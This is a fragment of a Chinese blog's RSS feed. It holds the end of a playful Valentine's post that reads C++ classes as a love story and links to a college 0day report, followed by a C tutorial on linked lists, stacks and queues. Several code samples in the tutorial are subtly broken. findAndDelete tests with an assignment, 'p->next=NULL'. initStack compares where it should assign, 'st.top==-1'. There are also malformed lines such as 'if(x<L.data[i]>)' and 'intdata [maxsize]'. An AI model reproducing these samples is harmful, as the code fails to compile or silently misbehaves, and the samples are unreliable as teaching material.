&lt;li&gt;创建一个Jx1类型的对象，并将其赋给m_love，这是一个std::unique_ptr&lt;People&gt;类型的智能指针，初始化为nullptr。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;析构函数 ~Xp():&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;调用m_love智能指针的release()方法，释放它所拥有的对象。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这段代码可能在比喻地讨论一个人（Xp类）在等待（sleep_for）了很长时间（比如24年）之后，找到了他们所爱的人（m_love是Jxl的一个实例），但最终又放手了（在析构函数中release）。&lt;/p&gt;
&lt;h5 id=&#34;第二段代码&#34;&gt;第二段代码&lt;/h5&gt;
&lt;p&gt;这段代码定义了一个Jxl类和一个Xp类。它还定义了一个概念（concept），这是C++20中引入的一个特性，用于约束模板参数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;概念 with:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用std::is_same来检查模板参数T是否与Jxl类型相同。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;类 Xp:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;使用了requires子句来约束模板参数T，必须满足with&lt;Jxl&gt;概念。这意味着Xp类模板只能用Jx1类型作为模板参数。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这段代码可能在比喻地表示，只有特定类型的对象（这里是Jxl）才能与Xp类&amp;quot;合作&amp;quot;或&amp;quot;匹配&amp;quot;。&lt;/p&gt;
&lt;h5 id=&#34;第三段代码&#34;&gt;第三段代码&lt;/h5&gt;
&lt;p&gt;在这段代码中，定义了两个类：Jxl和Xp。在Xp类中，有一个名为directions的模板成员函数。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;函数 directions:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;返回一个std::optional&lt;T&gt;。这是C++17的一个特性，它可能包含一个值或没有值。&lt;/li&gt;
&lt;li&gt;函数内部检查模板参数T是否与Jxl相同。如果是，就构造一个Jxl对象并返回它。如果不是，就返回std::nullopt，表明没有值。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这段代码可能在比喻地说，只有当满足特定条件时（这里是类型匹配Jxl），Xp类才能提供某种&amp;quot;方向&amp;quot;或&amp;quot;指示&amp;quot;（directions函数）。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/npyg1.png&#34; alt=&#34;1&#34;&gt;
&lt;img src=&#34;https://xuoneyuan.github.io/images/npyg2.png&#34; alt=&#34;1&#34; title=&#34;果然21世纪是人工智能的世纪&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;知乎回答&#34;&gt;知乎回答&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/npy5.png&#34; alt=&#34;1&#34;&gt;
也有专业老哥对这段代码进行了指正
&lt;img src=&#34;https://xuoneyuan.github.io/images/npy6.png&#34; alt=&#34;1&#34;&gt;
总体而言我对这段代码的评价是
&lt;img src=&#34;https://xuoneyuan.github.io/images/npy7.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;part-2&#34;&gt;PART 2&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://src.sjtu.edu.cn/post/270577/&#34;&gt;福建农业职业技术学院0day&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;某一天我的说说和朋友圈被这个消息刷屏了，群里也有非常多老哥在讨论这个，那几天在安全圈非常火
&lt;img src=&#34;https://xuoneyuan.github.io/images/src1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;评论区回答&#34;&gt;评论区回答&lt;/h4&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/src2.png&#34; alt=&#34;1&#34;&gt;
&lt;img src=&#34;https://xuoneyuan.github.io/images/src3.png&#34; alt=&#34;1&#34;&gt;
下面这位师傅我要着重介绍一下，梅苑师傅是我电的硕士生，我报了校友身份直接让我免费进他的知识星球了（虽然现在我不学安全了但是偶尔还会去看看），据我所知学长现在还在国科大北京某研究所实习
&lt;img src=&#34;https://xuoneyuan.github.io/images/src4.png&#34; alt=&#34;1&#34; title=&#34;梅苑师傅也是性情中人啊&#34;&gt;&lt;/p&gt;
&lt;p&gt;好了，情人节特辑先更新到这里，后续我发现了精彩内容会继续更新的~~&lt;/p&gt;
</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/categories/%E6%9D%82%E6%96%87/">杂文</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/%E8%8A%82%E6%97%A5%E5%BA%86%E5%85%B8/">节日庆典</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>数据结构</title>
                <link>https://xuoneyuan.github.io/posts/14/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/14/</guid>
                <pubDate>Sun, 21 Jan 2024 19:47:55 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;h2 id=&#34;线性表&#34;&gt;线性表&lt;/h2&gt;
&lt;h3 id=&#34;线性表的基本概念与实现&#34;&gt;线性表的基本概念与实现&lt;/h3&gt;
&lt;h4 id=&#34;线性表的定义&#34;&gt;线性表的定义&lt;/h4&gt;
&lt;p&gt;线性表是具有相同特性数据元素的一个有限序列&lt;/p&gt;
&lt;h4 id=&#34;线性表的存储结构&#34;&gt;线性表的存储结构&lt;/h4&gt;
&lt;p&gt;线性表的存储结构有顺序存储结构和链式存储结构两种。前者称为顺序表，后者称为链表&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;顺序表&lt;br&gt;
顺序表就是把线性表中的所有元素按照其逻辑顺序，依次存储到从指定的存储位置开始的一块连续的存储空间中。线性表中第一个元素的存储位置就是指定的存储位置，第i+1个元素的存储位置紧接在第i个元素的存储位置的后面&lt;/li&gt;
&lt;li&gt;链表&lt;br&gt;
在链表存储中，每个结点不仅包含所存元素的信息，还包含元素之间逻辑关系的信息，如单链表中前驱结点包含了后继结点的地址信息，这样就可以通过前驱结点中的地址信息找到后继结点的位置。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;链表有以下5种形式&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;单链表&lt;br&gt;
在每个结点中除了包含数据域外，还包含一个指针域，用以指向其后继结点。
&lt;img src=&#34;https://xuoneyuan.github.io/images/lb1.png&#34; alt=&#34;1&#34;&gt;
①带头结点的单链表中，头指针head指向头结点，头结点的值域不含任何信息，从头结点的后继结点开始存储数据信息。头指针head始终不等于NULL，当head-&amp;gt;next 等于NULL时，链表为空。&lt;br&gt;
②不带头结点的单链表中的头指针head直接指向开始结点，即图中的结点A1，当head等于NULL时，链表为空。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;总之，两者最明显的区别是，带头结点的单链表中有一个结点不存储信息（仅存储一些描述链表属性的信息，如表长)，只是作为标志，而不带头结点的单链表的所有结点都存储信息。&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;
&lt;p&gt;双链表
双链表就是在单链表结点上增添了一个指针域，指向当前结点的前驱。这样就可以方便地由其后继来找到其前驱，从而实现输出从终端结点到开始结点的数据序列。
&lt;img src=&#34;https://xuoneyuan.github.io/images/lb2.png&#34; alt=&#34;1&#34;&gt;
同样，双链表也分为带头结点的双链表和不带头结点的双链表，情况类似于单链表。带头结点的双链表，当head-&amp;gt;next为NULL时，链表为空;不带头结点的双链表，当head为NULL时，链表为空。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;循环单链表&lt;br&gt;
将单链表的最后一个指针域(空指针）指向链表中的第一个结点即可
&lt;img src=&#34;https://xuoneyuan.github.io/images/lb3.png&#34; alt=&#34;1&#34;&gt;
带头结点的循环单链表，当head等于head-&amp;gt;next时，链表为空；不带头结点的循环单链表，当head等于NULL时，链表为空。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;循环双链表&lt;br&gt;
将终端结点的next指针指向链表中的第一个结点，将链表中第一个结点的 prior指针指向终端结点。&lt;br&gt;
当head等于NULL时，不带头结点的循环双链表为空。带头结点的循环双链表中是没有空指针的，其空状态下，head-&amp;gt;next和 head-&amp;gt;prior必然都等于head。所以判断其是否为空，只需要检查head-&amp;gt;next和 head-&amp;gt;prior两个指针中的任意一个是否等于head指针即可。因此，以下四句代码中的任意-句为真，都可以判断循环双链表为空。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;head-&amp;gt;next == head;
head-&amp;gt;prior == head;
head-&amp;gt;next == head &amp;amp;&amp;amp; head-&amp;gt;prior == head;
head-&amp;gt;next == head || head-&amp;gt;prior == head;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/lb4.png&#34; alt=&#34;1&#34;&gt;
5) 静态链表&lt;br&gt;
静态链表借助一维数组来表示
&lt;img src=&#34;https://xuoneyuan.github.io/images/lb5.png&#34; alt=&#34;1&#34;&gt;
左图是静态链表，右图是其对应的一般链表。一般链表结点空间来自于整个内存，静态链表则来自于一个结构体数组。数组中的每一个结点含有两个分量:一个是数据元素分量 data;另一个是指针分量,指示了当前结点的直接后继结点在数组中的位置(这和一般链表中next指针的地位是同等的)。&lt;/p&gt;



&lt;div class=&#34;notice notice-note&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zm-248 50a46 46 0 100 92 46 46 0 000-92zm-44-165l8 136c0 6 5 11 12 11h48c7 0 12-5 12-11l8-136c0-7-5-13-12-13h-64c-7 0-12 6-12 13z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;顺序表和链表的比较&lt;/p&gt;
&lt;p&gt;(1) 基于空间的比较&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;存储分配的方式:顺序表的存储空间是一次性分配的，链表的存储空间是多次分配的。&lt;/li&gt;
&lt;li&gt;存储密度（存储密度=结点值域所占的存储量/结点结构所占的存储总章-顺序表的存储密度=1，链表的存储密度&amp;lt;1（因为结点中有指针域)。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;(2) 基于时间的比较&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;存取方式:
顺序表可以随机存取，也可以顺序存取（对于顺序表，一般只答随机存取即可);链表只能顺序存取（所谓顺序存取，以读取为例，要读取某个元素必须遍历其之前的所有元素才能找到并读取它)&lt;/li&gt;
&lt;li&gt;插入/删除时移动元素的个数:顺序表平均需要移动近一半元素;链表不需要移动元素，只需要修改指针。&lt;/li&gt;
&lt;/ol&gt;&lt;/div&gt;

&lt;h3 id=&#34;线性表的结构体定义和基本操作&#34;&gt;线性表的结构体定义和基本操作&lt;/h3&gt;
&lt;h4 id=&#34;线性表的结构体定义&#34;&gt;线性表的结构体定义&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;顺序表的结构体定义&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;typedef struct
{
    intdata [maxsize];//存放顺序表元素的数组(默认是int型,可根据题目要求将int换成其他类型)
    int length;//存放顺序表的长度

}Sqlist;//顺序表类型的定义
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;用的最多的是这种定义&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int A[maxSize];
int n;
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;单链表结点定义&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;typedef struct LNode
{
    int data;//data中存放结点数据域(默认是int型)
    struct LNode *next;//指向后继结点的指针
}LNode;//定义单链表结点类型
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/lb6.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;双链表结点定义&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;typedef struct DLNode
{
    int data;//data中存放结点数据域(默认是 int型)
    struct DLNode *prior;//指向前驱结点的指针
    struct DLNode *next;//指向后继结点的指针
}DLNode;//定义双链表结点类型
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/lb7.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;



&lt;div class=&#34;notice notice-tip&#34; &gt;
    &lt;div class=&#34;notice-title&#34;&gt;&lt;svg xmlns=&#34;http://www.w3.org/2000/svg&#34; class=&#34;icon notice-icon&#34; viewBox=&#34;0 0 512 512&#34;&gt;&lt;path d=&#34;M504 256a248 248 0 11-496 0 248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z&#34;/&gt;&lt;/svg&gt;&lt;/div&gt;&lt;p&gt;说明:结点是内存中一片由用户分配的存储空间，只有一个地址来表示它的存在，没有显式的名称，因此我们会在分配链表结点空间时定义一个指针，来存储这片空间的地址（这个过程通俗地讲叫指针指向结点)，并且常用这个指针的名称来作为结点的名称。&lt;/p&gt;&lt;/div&gt;

&lt;h4 id=&#34;顺序表的操作&#34;&gt;顺序表的操作&lt;/h4&gt;
&lt;p&gt;【例1】己知一个顺序表L，其中的元素递增有序排列，设计一个算法，插入一个元素x(x为 int型）后保持该顺序表仍然递增有序排列(假设插入操作总能成功)&lt;/p&gt;
&lt;p&gt;分析:&lt;br&gt;
由题干可知，解决本题需完成两个操作:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;找出可以让顺序表保持有序的插入位置。&lt;/li&gt;
&lt;li&gt;将步骤1)中找出的位置上以及其后的元素往后移动一个位置，然后将x放至腾出的位置上。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;操作一:因为顺序表L中的元素是递增排列的，所以可以从小到大逐个扫描表中元素，当找到第一个比x大的元素时,将插在这个元素之前即可。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int findElem (Sqlist L, int x)
{
    int i;
    for(i=0;i&amp;lt;L.length;++i)
    {
        if(x&amp;lt;L.data[i]&amp;gt;) //对顺序表中的元素从小到大逐个进行判断,看x是否小于当前所扫描到的元素,如果小于则返回当前位置i
        {
            return i;
        }
    }
    return i;//如果顺序表中不存在比×大的元素,则应将x插入表尾元素之后,返回i来标记这种情况(因i&amp;lt;L.length这一句不成立而退出for循环后,i正好指示了表尾元素之后的位置,同样也是正确的插入位置)
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;操作二:找到插入位置之后,将插入位置及其以后的元素向后移动一个元素的位置即可。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void insertElem (Sqlist &amp;amp;L,int x)
{
    int p,i;
    p=findElem(L,x);
    for(i=L.length-1;i&amp;gt;=p;--i)
    {
        L.data[i+1]=L.data[i];//从右往左,逐个将元素右移一个位置
    }
    L.data[p]=x;//将×放在插入位置p上
    ++ (L.length);//表内元素多了一个,因此表长自增1
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;【例2】删除顺序表L中下标为p (0≤p≤length-1)的元素，成功返回1，否则返回0，并将被删除元素的值赋给e&lt;/p&gt;
&lt;p&gt;分析：&lt;br&gt;
要删除表中下标为p的元素，只需将其后边的元素逐个往前移动一个位置，将p位置上的元素覆盖掉，就达到了删除的目的。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int deleteElem (Sqlist &amp;amp;L, int p, int &amp;amp;e)
{
    int i;
    if(p&amp;lt;0||p&amp;gt;L.length-1)
    {
        return 0;
    }
    e=L.data[p];//将被删除元素赋值给e
    for(i=p;i&amp;lt;L.length-1;++i)//从p位置开始,将其后边的元素逐个前移一个位置
    {
        L.data[i]=L.data[i+1];
    }
    -- (L.length);
    return 1;
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;单链表的操作&#34;&gt;单链表的操作&lt;/h4&gt;
&lt;p&gt;【例3】A和B是两个单链表（带表头结点)，其中元素递增有序。设计一个算法，将A和B归并成一个按元素值非递减有序的链表C，C由A和B中的结点组成&lt;/p&gt;
&lt;p&gt;分析：
已知A、B中的元素递增有序，要使归并后的C中元素依然有序，可以从A、B中挑出最小的元素插入C的尾部，这样当A、B中的所有元素都插入C中时，C一定是递增有序的。由于A、B是递增的，因此A中的最小元素是其开始结点中的元素，B也一样。只需从A、B的开始结点中选出一个较小的来插入C的尾部即可。这里还需注意，A与B中的元素有可能一个已经全部被插入到C中，另一个还没有插完，如A中所有元素已经全部插入到C中，而B还没有插完，这说明B中的所有元素都大于C中的元素，因此只要将B链接到C的尾部即可。如果A没有插完，则用类似的方法来解决。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void merge (LNode *A, LNode *B, LNode *&amp;amp;C)
{
    LNode *p = A-&amp;gt;next;
    LNode *q = B-&amp;gt;next;
    LNode *r;
    C=A;
    C-&amp;gt;next=NULL;
    free(B);
    r=C;
    while(p!=NULL&amp;amp;&amp;amp;q!=NULL)
    {
        if(p-&amp;gt;data&amp;lt;=q-&amp;gt;data)
        {
            r-&amp;gt;next=p;
            p=p-&amp;gt;next;
            r=r-&amp;gt;next;
        }
        else
        {
            r-&amp;gt;next=q;
            q=q-&amp;gt;next;
            r=r-&amp;gt;next;
        }
    }
    r-&amp;gt;next=NULL;
    if(p!=NULL) r-&amp;gt;next=p;
    if(q!=NULL) r-&amp;gt;next=q;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;尾插法&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void createlistR (LNode *&amp;amp;C, int a[], int n)
{
    LNode *s, *r;
    int i;
    C=(LNode *)malloc(sizeof(LNode));
    C-&amp;gt;next=NULL;
    r=C;
    for(i=0;i&amp;lt;n;++i)
    {
        s=(LNode *)malloc(sizeof(LNode));
        s-&amp;gt;data=a[i];
        r-&amp;gt;next=s;
        r=r-&amp;gt;next;
    }
    r-&amp;gt;next=NULL;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;头插法&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void createlistF (LNode *&amp;amp;C, int a[], int n)
{
    LNode *s;
    int i;
    C=(LNode *)malloc(sizeof(LNode));
    C-&amp;gt;next=NULL;
    for(i=0;i&amp;lt;n;++i)
    {
        s=(LNode *)malloc(sizeof(LNode));
        s-&amp;gt;data=a[i];
        s-&amp;gt;next=C-&amp;gt;next;
        C-&amp;gt;next=s;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;【例4】查找链表C(带头结点)中是否存在一个值为x的结点，若存在，则删除该结点并返回1,否则返回0&lt;/p&gt;
&lt;p&gt;分析：&lt;br&gt;
对于本题需要解决两个问题:一个是要找到值为×的结点，另一个是将找到的结点删除。第一个问题引出了本章要讲的单链表中最后-一个重要操作一―链表中结点的查找。为了实现查找，定义一个结点指针变量p，让它沿着链表一直走到表尾，每遇到一个新结点就检测其值是否为x，是则证明找到，不是则继续检测下一个结点。当找到值为x的结点后删除该结点。&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int findAndDelete (LNode *C, int x)
{
    LNode *p, *q;
    p=C;
    while(p-&amp;gt;next!=NULL)
    {
        if(p-&amp;gt;next-&amp;gt;data==x)
        {
            break;
        }
        p=p-&amp;gt;next;
    }
    if(p-&amp;gt;next=NULL)
    {
        return 0;
    }
    else 
    {
        q=p-&amp;gt;next;
        p-&amp;gt;next=p-&amp;gt;next-&amp;gt;next;
        free(q);
        return 1;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;双链表的操作&#34;&gt;双链表的操作&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;采用尾插法建立双链表&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void createDlistR(DLNode *&amp;amp;L, int a[], int n)
{
    DLNode *s,*r;
    int i;
    L=(DLNode*)malloc(sizeof(DLNode));
    L-&amp;gt;prior=NULL;
    L-&amp;gt;next=NULL;
    r=L;
    for(i=0;i&amp;lt;n;++i)
    {
        s=(DLNode*)malloc(sizeof(DLNode));
        s-&amp;gt;data=a[i];

        r-&amp;gt;next=s;
        s-&amp;gt;prior=r;
        r=s;
    }
    r-&amp;gt;next=NULL;
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;查找结点的算法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;DLNode *findNode(DLNode *C, int x)
{
    DLNode *p=C-&amp;gt;next;
    while(p!=NULL)
    {
        if(p-&amp;gt;data==x)
        {
            break;
        }
        p=p-&amp;gt;next;
    }
    return p;
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;插入结点的算法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;s-&amp;gt;next=p-&amp;gt;next;
s-&amp;gt;prior=p;
p-&amp;gt;next=s;
s-&amp;gt;next-&amp;gt;prior=s;
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;删除结点的算法&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;q=p-&amp;gt;next;
p-&amp;gt;next=q-&amp;gt;next;
q-&amp;gt;next-&amp;gt;prior=p;
free(q);
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;逆置问题&#34;&gt;逆置问题&lt;/h4&gt;
&lt;p&gt;【例5】&lt;br&gt;
(1) 将一长度为n的数组的前端k(k&amp;lt;n)个元素逆序后移动到数组后端，要求原数组中数据不丢失，其余元素的位置无关紧要。&lt;br&gt;
(2) 将一长度为n的数组的前端k(k&amp;lt;n)个元素保持原序移动到数组后端，要求原数组中数据不丢失，其余元素的位置无关紧要。&lt;br&gt;
(3) 将数组中的元素（X&lt;sub&gt;0&lt;/sub&gt;，X&lt;sub&gt;1&lt;/sub&gt;，…，X&lt;sub&gt;n-1&lt;/sub&gt;)，经过移动后变为(X&lt;sub&gt;p&lt;/sub&gt;，X&lt;sub&gt;p+1&lt;/sub&gt;，…，X&lt;sub&gt;n-1&lt;/sub&gt;,X&lt;sub&gt;0&lt;/sub&gt;，X&lt;sub&gt;1&lt;/sub&gt;，…,X&lt;sub&gt;p-i&lt;/sub&gt;)，即循环左移p(0&amp;lt;p&amp;lt;n)个位置。&lt;/p&gt;
&lt;p&gt;分析：
(1) 只需要逆置整个数组，即可满足前端k个元素逆序后放到数组的后端&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void reverse(int a[], int left, int right, int k)
{
    int temp;
    for (int i=left,j=right;i&amp;lt;left+k &amp;amp;&amp;amp; i&amp;lt;j;++i,--j)
    {
        temp=a[i];
        a[i]=a[j];
        a[j]=temp;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;(2) 只需要将前端k个元素逆置，然后将整个数组逆置，即可满足前端k个元素保持原序放到数组的后端&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void moveToEnd (int a[], int n, int k)
{
    reverse(a,0,k-1,k);
    reverse(a,0,n-1,k);
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;(3) 只需要将0~p-1位置的元素逆置，再将p~n-1位置的元素逆置，然后将整个数组逆置即可&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void moveP (int a[], int n, int p)
{
    reverse(a,0,p-1,p);
    reverse(a,p,n-1,n-p);
    reverse(a,0,n-1,n); 
}
&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;栈和队列&#34;&gt;栈和队列&lt;/h2&gt;
&lt;h3 id=&#34;栈和队列的基本概念&#34;&gt;栈和队列的基本概念&lt;/h3&gt;
&lt;h4 id=&#34;栈的基本概念&#34;&gt;栈的基本概念&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;栈的定义&lt;br&gt;
栈是一种只能在一端进行插入或删除操作的线性表。其中允许进行插入或删除操作的一端称为栈顶(Top)。表的另一端称为栈底，栈底是固定不变的。栈的插入和删除操作一般称为入栈和出栈。&lt;/li&gt;
&lt;li&gt;栈的特点&lt;br&gt;
由栈的定义可以看出，栈的主要特点是先进后出（FILO)。&lt;/li&gt;
&lt;li&gt;栈的存储结构&lt;br&gt;
可用顺序表和链表来存储栈，依照存储结构分为两种:顺序栈和链式栈。&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;队列的基本概念&#34;&gt;队列的基本概念&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;队列的定义&lt;br&gt;
队列简称队，它也是一种操作受限的线性表，其限制为仅允许在表的一端进行插入，在表的另一端进行删除。可进行插入的一端称为队尾(Rear)，可进行删除的一端称为队头（Front)。向队列中插入新的元素称为进队，新元素进队后就成为新的队尾元素;从队列中删除元素称为出队，元素出队后，其后继元素就成为新的队头元素。&lt;/li&gt;
&lt;li&gt;队列的特点&lt;br&gt;
队列的特点概括起来就是先进先出（FIFO)。&lt;/li&gt;
&lt;li&gt;队列的存储结构&lt;br&gt;
可用顺序表和链表来存储队列，队列按存储结构可分为顺序队和链队两种。&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;栈和队列的存储结构算法与应用&#34;&gt;栈和队列的存储结构、算法与应用&lt;/h3&gt;
&lt;h4 id=&#34;结构体定义&#34;&gt;结构体定义&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;顺序栈定义&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;typedef struct
{
    int data[maxSize];
    int top;
}SqStack;
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;链栈结点定义&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;typedef struct LNode
{
    int data;
    struct LNode *next;
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;顺序队列定义&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;typedef struct
{
    int data[maxSize];
    int front;
    int rear;
}SqQueue;
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;链队定义
(1) 队结点类型定义&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;typedef struct QNode
{
    int data;
    struct QNode *next;
}QNode;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;(2) 链队类型定义&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;typedef struct
{
    QNode *front;
    QNode *rear;
}LiQueue;
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;顺序栈&#34;&gt;顺序栈&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;顺序栈的要素
(1)状态&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;栈空状态&lt;br&gt;
st.top==-1&lt;/li&gt;
&lt;li&gt;栈满状态&lt;br&gt;
st.top==maxSize-1&lt;/li&gt;
&lt;li&gt;非法状态&lt;br&gt;
上溢和下溢
(2)操作&lt;/li&gt;
&lt;li&gt;进栈操作：++(st.top);st.data[st.top]=x;&lt;/li&gt;
&lt;li&gt;出栈操作：x=st.data[st.top]; --(st.top);&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;初始化栈的代码&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;void initStack(SqStack &amp;amp;st)
{
    st.top==-1;
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;判断栈空代码&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int isEmpty(SqStack st)
{
    if(st.top==-1)
    {
        return 1;
    }
    else {
        return 0;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;进栈代码&lt;/li&gt;
&lt;/ol&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;int push(SqStack &amp;amp;st, int x)
{
    if(st.top==maxSize-1)
        return 0;
    ++(st.top);
    st.data[st.top]=x;
        return 1;
}
&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;5&#34;&gt;
